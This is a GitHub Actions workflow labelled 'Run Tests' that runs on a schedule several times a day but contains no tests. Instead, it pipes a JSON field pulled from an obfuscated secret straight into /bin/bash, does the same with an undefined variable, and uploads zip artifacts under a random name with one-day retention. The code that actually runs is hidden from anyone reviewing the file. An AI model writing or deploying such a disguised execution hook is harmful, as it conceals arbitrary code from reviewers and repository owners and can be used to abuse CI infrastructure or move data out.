name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '9 5,11,17,23 * * *'
permissions:
  contents: read
  actions: read
jobs:
  execute:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          ur00: ${{ secrets.ur00 }}
        run: |
          printf '%s' "$ur00" | jq -r .r1991 | /bin/bash
          echo $r257 | jq -r .rm676 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
        with:
          name: qxDIgJ1S
          path: "*.zip"
          retention-days: 1
